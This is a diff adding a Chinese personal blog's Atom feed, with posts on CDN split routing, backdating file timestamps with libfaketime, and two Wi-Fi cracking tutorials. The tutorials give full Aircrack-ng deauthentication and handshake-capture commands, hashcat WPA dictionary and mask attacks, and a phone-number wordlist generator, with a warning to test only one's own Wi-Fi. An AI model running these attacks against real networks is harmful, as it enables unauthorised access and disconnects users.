@@ -1,0 +1,1022 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>热心市民L先生のBLOG</title>
+  
+  <subtitle>我在互联网上的自留地.</subtitle>
+  <link href="https://blog.oopsky.top/atom.xml" rel="self"/>
+  
+  <link href="https://blog.oopsky.top/"/>
+  <updated>2025-12-29T10:09:01.000Z</updated>
+  <id>https://blog.oopsky.top/</id>
+  
+  <author>
+    <name>WEI</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>零成本为网站增加国内外访客分流功能</title>
+    <link href="https://blog.oopsky.top/post/67ec153b/"/>
+    <id>https://blog.oopsky.top/post/67ec153b/</id>
+    <published>2025-12-29T03:55:31.000Z</published>
+    <updated>2025-12-29T10:09:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>本文旨在在不增加成本的情况下，让国内用户访问更快、国外用户体验更稳。只需要配合使用两个域名，通过Cloudflare 自定义主机名 + 国内 DNS 厂商分流解析 + 国内 CDN回源/直接访问国内源站，就可以实现“国内走国内 CDN/直连、国外走Cloudflare”的效果。</p><h2 id="前置条件">前置条件</h2><ul><li>开启 Cloudflare for SaaS 的 Cloudflare账号（需绑定信用卡，支持银联信用卡）</li><li>DNSPod 账号（支持境内外分流解析）</li><li>主域名（网站使用的域名）</li><li>中间域名（访客对于中间域名无感知）</li></ul><h2 id="配置步骤">配置步骤</h2><h3 id="在-dnspod-添加记录">1. 在 DNSPod 添加记录</h3><p>必须要添加默认线路的纪录（指向哪里无所谓，可配置为国内源站服务器），然后分别添加境内、境外线路</p><figure><imgsrc="https://cdn.oopsky.top/images/2025/12/251229175039-214a112cfe7ace721f31fe9423e1833f.webp"alt="在 DNSPod 添加记录" /><figcaption aria-hidden="true">在 DNSPod 添加记录</figcaption></figure><h3 id="在-cloudflare-给中间域名添加解析记录">2. 在 Cloudflare给中间域名添加解析记录</h3><p>这里的名称随意</p><figure><imgsrc="https://cdn.oopsky.top/images/2025/12/251229175057-dbe617fa8b794afded67bb78691c7517.webp"alt="给中间域名添加解析记录" /><figcaption aria-hidden="true">给中间域名添加解析记录</figcaption></figure><h3 id="在-cloudflare-配置回退源和自定义主机名">3. 在 Cloudflare配置回退源和自定义主机名</h3><p>位置：Cloudflare -&gt; SSL/TLS -&gt; 自定义主机名</p><figure><imgsrc="https://cdn.oopsky.top/images/2025/12/251229175109-51f8297d8f61112322b6fa412988c723.webp"alt="配置回退源和自定义主机名" /><figcaption aria-hidden="true">配置回退源和自定义主机名</figcaption></figure><h2 id="检查效果">检查效果</h2><figure><imgsrc="https://cdn.oopsky.top/images/2025/12/251229175126-8554cf8f11324364ac98bcf5025713e2.webp"alt="检查效果" /><figcaption aria-hidden="true">检查效果</figcaption></figure><p>这里使用的工具是：<a href="https://www.itdog.cn/ping"class="uri">https://www.itdog.cn/ping</a></p><h2 id="其他">其他</h2><p>腾讯云 EdgeOne 的免费套餐目前开放限量内测，2026 年 3 月 31日前都有机会上车，如果 Cloudflare绑卡有困难可以考虑一下它，我上面的截图里 DNSPod默认线路指向的就是它，启用它需要暂停上面在 DNSPod创建的境内境外分流解析记录，还需要域名已备案。<br />活动链接：<ahref="https://cloud.tencent.com/act/pro/eo-freeplan?from=28412#choujiang"class="uri">https://cloud.tencent.com/act/pro/eo-freeplan?from=28412#choujiang</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+&lt;p&gt;本文旨在在不增加成本的情况下，让国内用户访问更快、国外用户体验更稳。只需要配合使用两个域名，通过
+Cloudflare 自定义主机名 + 国内 DNS 厂商分流解析 + 国内 CDN
+回源/直接访问国内源站，就可以实现“国内走国内 C</summary>
+      
+    
+    
+    
+    
+    <category term="cloudflare" scheme="https://blog.oopsky.top/tags/cloudflare/"/>
+    
+    <category term="dns" scheme="https://blog.oopsky.top/tags/dns/"/>
+    
+    <category term="dnspod" scheme="https://blog.oopsky.top/tags/dnspod/"/>
+    
+    <category term="cdn" scheme="https://blog.oopsky.top/tags/cdn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 libfaketime 修改容器内的时间</title>
+    <link href="https://blog.oopsky.top/post/5bbfeefd/"/>
+    <id>https://blog.oopsky.top/post/5bbfeefd/</id>
+    <published>2025-11-28T04:15:03.000Z</published>
+    <updated>2025-11-28T13:16:49.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天在传一些十几年前的相片录像啥的到飞牛里时发现有些文件的元数据里的创建时间有问题，导致它们在我相册里的先后顺序没被识别对，为了能在飞牛相册里生成正确的时间线，需要修改这些文件的创建时间为大致正确的时间，同时又希望尽量缩小影响范围，不想通过修改整个系统的时间来做这个事。</p><p>先是找到了libfaketime<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[1]</span></a></sup>这个工具，但这个库只对当时运行的二进制有关，影响不到正在运行的文件系统，或许有某种办法可以在挂载文件系统时或更早的阶段让libfaketime 介入，但我感觉有点风险，为了数据安全就先放下了这个想法。</p><p>后来在查资料的过程中发现还可以在容器里面利用 libfaketime修改容器内部时间<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="在此之前我还尝试了直接 exec 进容器修改时间，但提示缺少相关权限导致改不了，搜到的资料里说切到特权模式硬改的话会把宿主机的时间也改了，遂放弃。">[2]</span></a></sup>，妥了，容器里边就可以随便造了哈哈，只需要把文件所在目录挂载到容器内，然后在容器内把要处理的文件copy 到挂载目录之外的其他位置<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="如果只是在挂载目录内操作，其实还是等同于直接在外面的文件系统操作，但外面的文件系统是已经运行在真实的时间下的，libfaketime 无法对它施加影响。">[3]</span></a></sup>再覆盖回来,就可以把创建时间变成过去的时间了，下面是步骤：</p><h2 id="创建-dockerfile-文件">1. 创建 Dockerfile 文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> faketime<br><span class="hljs-built_in">cd</span> faketime<br>vim Dockerfile<br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> m.daocloud.io/docker.io/alpine:latest<br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s#https\?://dl-cdn.alpinelinux.org/alpine#https://mirror.nju.edu.cn/alpine#g&#x27;</span> /etc/apk/repositories</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk update &amp;&amp; apk add make gcc g++ git fd bash</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://hk.gh-proxy.org/https://github.com/wolfcw/libfaketime &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> libfaketime/src &amp;&amp; make install</span><br><br><span class="hljs-comment"># 设定固定日期</span><br><span class="hljs-comment">#ENV LD_PRELOAD=/usr/local/lib/faketime/libfaketime.so FAKETIME=&quot;2012-01-22 8:22:22&quot;</span><br><span class="hljs-comment"># 设定“起始于”日期，容器启动后容器内时间将会在设定日期基础上实时变化</span><br><span class="hljs-keyword">ENV</span> LD_PRELOAD=/usr/local/lib/faketime/libfaketime.so FAKETIME=<span class="hljs-string">&quot;@2012-01-22 8:22:22&quot;</span><br></code></pre></td></tr></table></figure><h2 id="构建镜像">2. 构建镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t faketime:v1 ./<br></code></pre></td></tr></table></figure><h2 id="启动容器">3. 启动容器</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接启动容器</span><br>docker run -it --<span class="hljs-built_in">rm</span> --volume /data/Camera:/data <span class="hljs-keyword">time</span>:v1 bash<br><span class="hljs-comment"># 可以在启动容器时重新设定 FAKETIME 变量</span><br>docker run -it --<span class="hljs-built_in">rm</span> --volume /data/Camera:/data -e FAKETIME=<span class="hljs-string">&quot;2015-01-22 8:22:22&quot;</span> <span class="hljs-keyword">time</span>:v1 bash<br></code></pre></td></tr></table></figure><h2 id="处理文件">4. 处理文件</h2><p>在容器内执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /data/*.VDI ~/<br><span class="hljs-built_in">mkdir</span> -p /data/vdi-bak &amp;&amp; <span class="hljs-built_in">mv</span> /data/*.VDI /data/vdi-bak<br><span class="hljs-built_in">mv</span> ~/*.VDI /data/<br></code></pre></td></tr></table></figure><h2 id="验证">5. 验证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[idea@MiniPC /data/Camera]# <span class="hljs-built_in">stat</span> SUNP0117.AVI<br><span class="hljs-comment"># File: SUNP0117.AVI</span><br><span class="hljs-comment">#  Size: 4919296         Blocks: 9608       IO Block: 4096   regular file</span><br><span class="hljs-comment"># Device: 8,17    Inode: 25305122    Links: 1</span><br><span class="hljs-comment"># Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="hljs-comment"># Access: 2012-01-22 16:20:40.000000000 +0800</span><br><span class="hljs-comment"># Modify: 2012-01-22 16:20:40.000000000 +0800</span><br><span class="hljs-comment"># Change: 2025-11-27 21:45:46.431720916 +0800</span><br><span class="hljs-comment">#  Birth: 2025-11-27 21:45:46.418387463 +0800</span><br></code></pre></td></tr></table></figure><p>可以看到，修改生效了。</p><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://github.com/wolfcw/libfaketime"class="uri">https://github.com/wolfcw/libfaketime</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>在此之前我还尝试了直接 exec进容器修改时间，但提示缺少相关权限导致改不了，搜到的资料里说切到特权模式硬改的话会把宿主机的时间也改了，遂放弃。<a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3"class="footnote-text"><span>如果只是在挂载目录内操作，其实还是等同于直接在外面的文件系统操作，但外面的文件系统是已经运行在真实的时间下的，libfaketime无法对它施加影响。<a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;今天在传一些十几年前的相片录像啥的到飞牛里时发现有些文件的元数据里的创建时间有问题，导致它们在我相册里的先后顺序没被识别对，为了能在飞牛相册里生成正确的时间线，需要修改这些文件的创建时间为大致正确的时间，同时又希望尽量缩小影响范围，不想通过修改整个系统的时间来做这个事。&lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="docker" scheme="https://blog.oopsky.top/tags/docker/"/>
+    
+    <category term="faketime" scheme="https://blog.oopsky.top/tags/faketime/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>速度更快的「密码恢复工具」：hashcat</title>
+    <link href="https://blog.oopsky.top/post/8870bccb/"/>
+    <id>https://blog.oopsky.top/post/8870bccb/</id>
+    <published>2025-11-08T13:21:21.000Z</published>
+    <updated>2025-11-09T14:06:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>书接上文<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[1]</span></a></sup>，最近又发现了一个新的软件：hashcat<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[2]</span></a></sup>，和Aircrack-ng 里的 WPA 密码破解器相比，它的速度更快，功能更多，且支持 GPU加速。这个项目的 Github 仓库<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[3]</span></a></sup>里写的对它自己的介绍也很自信： <em>hashcat is the world's fastest andmost advanced password recovery utility</em> ，哈哈。</p><h2 id="把-cap-文件转换成-hashcat-支持的格式">把 cap 文件转换成 hashcat支持的格式</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hcxpcapngtool</span> -o Wi-Fi_capture-<span class="hljs-number">01</span>.hc22000 Wi-Fi_capture-<span class="hljs-number">01</span>.cap<br></code></pre></td></tr></table></figure><h2 id="使用-hashcat-破解密码">使用 hashcat 破解密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用单个字典暴力破解</span><br>hashcat -m 22000 -a 0 Wi-Fi_capture-01.hc22000 ~/phone_numbers_dict.txt<br><br><span class="hljs-comment"># 没有字典，使用掩码匹配所有特定结构的密码</span><br>hashcat -m 22000 -a 3 Wi-Fi_capture-01.hc22000 ?l?l?l?d?d?d?d?d<br><br><span class="hljs-comment"># 两个字典，手机号+中国常见姓氏拼音</span><br>hashcat -m 22000 -a 1 Wi-Fi_capture-01.hc22000 ~/phone_numbers_dict.txt ~/BaiJiaXing_pinyin.txt<br>hashcat -m 22000 -a 1 Wi-Fi_capture-01.hc22000 ~/BaiJiaXing_pinyin.txt ~/phone_numbers_dict.txt<br><br><span class="hljs-comment"># 掩码/字典混合模式，字母+手机号</span><br>hashcat -m 22000 -a 6 Wi-Fi_capture-01.hc22000 ~/phone_numbers_dict.txt ?l?l<br>hashcat -m 22000 -a 6 Wi-Fi_capture-01.hc22000 ~/phone_numbers_dict.txt ?u?u<br>hashcat -m 22000 -a 7 Wi-Fi_capture-01.hc22000 ?l?l ~/phone_numbers_dict.txt<br>hashcat -m 22000 -a 7 Wi-Fi_capture-01.hc22000 ?u?u ~/phone_numbers_dict.txt<br><br><span class="hljs-comment"># 全部手机号都做到字典里文件就有点太大了，只把前7位放字典里，后四位使用掩码</span><br>hashcat -m 22000 -a 6 Wi-Fi_capture-01.hc22000 ~/phone_prefix_dict.txt ?d?d?d?d<br></code></pre></td></tr></table></figure><p>常用参数释义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-w 2 <span class="hljs-comment"># 工作负载，默认为2（均衡模式），可设为3（全力以赴模式，会导致图形界面卡顿）或4（疯狂模式，只建议在纯命令行模式下使用）</span><br>-a 0 <span class="hljs-comment"># 使用单个字典暴力破解</span><br>-a 1 <span class="hljs-comment"># 组合两个字典，详见 https://hashcat.net/wiki/doku.php?id=combinator_attack</span><br>-a 3 <span class="hljs-comment"># 使用掩码匹配所有特定结构的密码，详见 https://hashcat.net/wiki/doku.php?id=mask_attack</span><br>-a 6 <span class="hljs-comment"># 字典+掩码，详见 https://hashcat.net/wiki/doku.php?id=hybrid_attack</span><br>-a 7 <span class="hljs-comment"># 掩码+字典，详见 https://hashcat.net/wiki/doku.php?id=hybrid_attack</span><br>-D 1 <span class="hljs-comment"># 指定使用CPU还是GPU等，默认是1（表示使用CPU），可改为2（使用GPU加速）</span><br></code></pre></td></tr></table></figure><p>掩码：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-literal">-</span> ?l = abcdefghijklmnopqrstuvwxyz<br><span class="hljs-literal">-</span> ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ<br><span class="hljs-literal">-</span> ?d = 0123456789<br><span class="hljs-literal">-</span> ?h = 0123456789abcdef<br><span class="hljs-literal">-</span> ?H = 0123456789ABCDEF<br><span class="hljs-literal">-</span> ?s = «space»!&quot;<span class="hljs-comment">#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br><span class="hljs-literal">-</span> ?a = ?l?u?d?s<br><span class="hljs-literal">-</span> ?b = 0x00 - 0xff<br></code></pre></td></tr></table></figure><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://blog.oopsky.top/post/6e155fd/"class="uri">https://blog.oopsky.top/post/6e155fd/</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span><a href="https://hashcat.net/hashcat"class="uri">https://hashcat.net/hashcat</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3"class="footnote-text"><span><a href="https://github.com/hashcat/hashcat"class="uri">https://github.com/hashcat/hashcat</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;书接上文
+&lt;sup id=&quot;fnref:1&quot; class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn:1&quot; rel=&quot;footnote&quot;&gt;&lt;span
+class=&quot;hint--top hint--rounded&quot;
+aria-label=&quot;&quot;&gt;[1]&lt;/span&gt;</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="kali" scheme="https://blog.oopsky.top/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 Aircrack-ng 破解 Wi-Fi 密码</title>
+    <link href="https://blog.oopsky.top/post/6e155fd/"/>
+    <id>https://blog.oopsky.top/post/6e155fd/</id>
+    <published>2025-11-02T13:30:02.000Z</published>
+    <updated>2025-11-21T15:25:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="说在前面">说在前面</h2><p><strong>不建议在未经允许的情况下破解他人的 Wi-Fi，建议使用自己的Wi-Fi 测试。</strong></p><p>本方案的原理：监听目标 Wi-Fi，同时对目标 Wi-Fi 发起攻击，使正常连接该Wi-Fi 的设备断线，断线后设备会尝试重新连接Wi-Fi，此时会发送包含加密过的密码的握手包，我们就能抓取到这个握手包，再用字典中的密码挨个按照相同加密方式去匹配抓到的握手包。</p><p>简而言之：最后能不能成功还是依赖于字典，只有 Wi-Fi密码刚好在字典中存在才能有机会匹配到，不存在那就没戏了，暴力破解就是这样子的，全靠运气和莽😂。</p><h2 id="准备测试环境">准备测试环境</h2><h3 id="检查无线网卡是否支持监听模式">1.检查无线网卡是否支持监听模式</h3><p>如果自己电脑物理机装的就是 Linux 系统，直接执行 iwlist，检查输出是否有“monitor”字样，如果没有，需要自行准备支持监听模式的USB 网卡之类的东西，我用的是在淘宝买的 MT7921 USB 无线网卡。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">iw list<br><br><span class="hljs-comment"># ...</span><br><span class="hljs-comment">#Supported interface modes:</span><br><span class="hljs-comment">#         * managed</span><br><span class="hljs-comment">#         * AP</span><br><span class="hljs-comment">#         * AP/VLAN</span><br><span class="hljs-comment">#         * monitor # 监听模式</span><br><span class="hljs-comment">#         * P2P-client</span><br><span class="hljs-comment">#         * P2P-GO</span><br><span class="hljs-comment"># ...</span><br></code></pre></td></tr></table></figure><h3 id="准备测试环境-1">2. 准备测试环境</h3><p>在你的 Linux 系统中安装Aircrack-ng<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[1]</span></a></sup>工具包，或者直接去 镜像站<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[2]</span></a></sup> 下载Live 版的 Kali Linux 系统镜像（比如<code>kali-linux-2025.3-live-amd64.iso</code>），自行制作系统盘，然后引导进入Live 环境进行后面的操作，如果你是用的 USB无线网卡，也可以用虚拟机测试，USB无线网卡可以很方便的直接连接到虚拟机。</p><p>如果你用的是 Windows，只建议使用虚拟机 +无线网卡的方案，不建议尝试直接在 Windows 运行Aircrack-ng，兼容性不好。</p><h2 id="测试步骤">测试步骤</h2><h3 id="网卡切换到监听模式">1. 网卡切换到监听模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">airmon-ng start wlan0<br></code></pre></td></tr></table></figure><h3 id="清理干扰进程">2. 清理干扰进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">airmon-ng check <span class="hljs-built_in">kill</span><br></code></pre></td></tr></table></figure><h3 id="列出附近的-wi-fi-网络记下目标-wi-fi-的-bssid-和-ch信道">3.列出附近的 Wi-Fi 网络，记下目标 Wi-Fi 的 BSSID 和 CH（信道）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描2.4GHz 频段</span><br>airodump-ng wlan0mon<br><br><span class="hljs-comment"># 扫描 5GHz 频段</span><br>airodump-ng wlan0mon -C 5180-5885<br></code></pre></td></tr></table></figure><p>注意这里的无线网卡名称是  <code>wlan0mon</code>, 而不是 <code>wlan0</code>。因为刚刚开启了监听 (monitor) 模式。</p><h3 id="监听目标-wi-fi">4. 监听目标 Wi-Fi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng --bssid 2C:B2:1A:22:51:86 -c 3 -w ~/Wi-Fi_capture wlan0mon<br></code></pre></td></tr></table></figure><h3 id="发送-deauthentication-攻击">5. 发送 Deauthentication 攻击</h3><p>为了加速握手包的捕捉，可以发送 Deauthentication攻击，让目标设备断线并重新连接</p><p>新开一个终端。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 攻击无线AP</span><br><span class="hljs-comment"># aireplay-ng --deauth 10 -a 2C:B2:1A:22:51:86 wlan0mon</span><br><br><span class="hljs-comment"># 攻击客户端(-c 后面跟的是客户端mac地址)</span><br>aireplay-ng --deauth 10 -a 2C:B2:1A:22:51:86 -c 9C:5A:81:2A:C1:49 wlan0mon<br></code></pre></td></tr></table></figure><p>捕捉到握手包后就可以执行 <code>airmon-ng stop wlan0mon</code>停止监听模式了</p><h3 id="使用字典破解-wi-fi-密码">6. 使用字典破解 Wi-Fi 密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng -w /usr/share/wordlists/rockyou.txt Wi-Fi_capture-01.<span class="hljs-built_in">cap</span><br></code></pre></td></tr></table></figure><p>这里使用的是 kali 自带的密码本，为提高成功概率，可把 -w 后面的 txt文件换成自定义专用密码本。</p><h2 id="进阶操作制作自己的密码本">进阶操作：制作自己的密码本</h2><h3 id="例-1.-制作包含所有本地手机号的密码本">例 1.制作包含所有本地手机号的密码本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 下面的两个前缀只是例子，请自行查找当地的号段。</span><br>prefixes = [<span class="hljs-string">&#x27;1850006&#x27;</span>, <span class="hljs-string">&#x27;1301101&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_phone_numbers</span>(<span class="hljs-params">file_name</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> prefixes:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):  <span class="hljs-comment"># 后四位从0000到9999递增</span><br>                phone_number = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;prefix&#125;</span><span class="hljs-subst">&#123;i:04d&#125;</span>&quot;</span>  <span class="hljs-comment"># 格式化为11位</span><br>                file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;phone_number&#125;</span>\n&quot;</span>)<br><br>                <span class="hljs-comment"># 加上其他前缀后缀</span><br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>):<br>                    phone_number = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span><span class="hljs-subst">&#123;prefix&#125;</span><span class="hljs-subst">&#123;i:04d&#125;</span>&quot;</span><br>                    file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;phone_number&#125;</span>\n&quot;</span>)<br>                    phone_number = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;prefix&#125;</span><span class="hljs-subst">&#123;i:04d&#125;</span><span class="hljs-subst">&#123;j&#125;</span>&quot;</span><br>                    file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;phone_number&#125;</span>\n&quot;</span>)<br><br><span class="hljs-comment"># 调用函数生成并写入文件</span><br>generate_phone_numbers(<span class="hljs-string">&#x27;phone_numbers.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://github.com/aircrack-ng/aircrack-ng"class="uri">https://github.com/aircrack-ng/aircrack-ng</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span><a href="https://mirrors.cernet.edu.cn/kali-images/current/"class="uri">https://mirrors.cernet.edu.cn/kali-images/current/</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;说在前面&quot;&gt;说在前面&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;不建议在未经允许的情况下破解他人的 Wi-Fi，建议使用自己的
+Wi-Fi 测试。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;本方案的原理：监听目标 Wi-Fi，同时对目标 Wi-Fi 发起攻击，使正常连接该
+Wi-Fi</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="kali" scheme="https://blog.oopsky.top/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在拾光坞N3上部署 EasyTier</title>
+    <link href="https://blog.oopsky.top/post/ba8cb8ea/"/>
+    <id>https://blog.oopsky.top/post/ba8cb8ea/</id>
+    <published>2025-04-12T13:37:28.000Z</published>
+    <updated>2025-04-30T22:13:06.000Z</updated>
+    
